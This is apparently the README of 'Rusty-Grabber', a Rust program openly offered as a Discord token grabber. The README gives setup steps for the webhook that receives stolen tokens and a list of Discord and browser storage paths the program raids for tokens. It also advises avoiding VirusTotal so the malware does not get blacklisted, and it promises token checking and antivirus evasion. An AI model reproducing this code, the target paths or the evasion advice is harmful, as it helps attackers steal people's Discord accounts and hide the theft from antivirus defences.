# Rusty-Grabber 🚀
- *a blazing fast Discord Token Grabber, no popo made with python*

## Fastest Token Grabber **ever** :
```bash
Rusty-Grabber> time ./target/release/grabber
0.00user 0.00system 0:00.72elapsed 0%CPU (0avgtext+0avgdata 5396maxresident)k
0inputs+0outputs (1419major+0minor)pagefaults 0swaps
```
```
- Multithreading (Rayon, Tokio) -> Threading each path's and requests
- Parallelism (Rayon, jwalk) -> All files read simultaneously, jwalk to go to each entries fastly
- Mutex, Arc -> thread safety
```

## Fill your Webhook in utils.rs :
```bash
./src/global/utils.rs:4 in the WEBHOOK_URL const.
```

## virus total report with 0 Obfuscation, Xoring or AV Evasion
**![Alt text](https://media.discordapp.net/attachments/1146101828451303476/1146101874282471626/Wb8Bg40.png?width=1556&height=820)**
### Avoid using virus total when scanning the malware.
### They will blacklist the program
### Use [kleenscan](https://kleenscan.com/) instead (Anonymous reporting)

## I will maintain the code updated and more optimised
```md
- Work with new discord token's encryption 2023
- Grab all token's possible
- Check each token's
- Soon DiscordProtector bypasser and AV evasion maybe paid
```

## Browser's & Discord Client handle :
```rs
lazy_static! {
    pub static ref PATHS: HashMap<&'static str, String> = {
        let map = HashMap::from([
            ("Discord", format!("{}\\discord\\Local Storage\\leveldb\\", ROAMING)),
            ("Discord Canary", format!("{}\\discordcanary\\Local Storage\\leveldb\\", ROAMING)),
            ("Lightcord", format!("{}\\Lightcord\\Local Storage\\leveldb\\", ROAMING)),
            ("Discord PTB", format!("{}\\discordptb\\Local Storage\\leveldb\\", ROAMING)),
            ("Opera", format!("{}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", ROAMING)),
            ("Opera GX", format!("{}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\", ROAMING)),
            ("Amigo", format!("{}\\Amigo\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Torch", format!("{}\\Torch\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Kometa", format!("{}\\Kometa\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Orbitum", format!("{}\\Orbitum\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("CentBrowser", format!("{}\\CentBrowser\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("7Star", format!("{}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Sputnik", format!("{}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Vivaldi", format!("{}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome SxS", format!("{}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome", format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome1", format!("{}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome2", format!("{}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome3", format!("{}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome4", format!("{}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome5", format!("{}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\", APPDATA)),
            ("Epic Privacy Browser", format!("{}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Microsoft Edge", format!("{}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Uran", format!("{}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Yandex", format!("{}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Iridium", format!("{}\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ]);
        map
    };
}
```
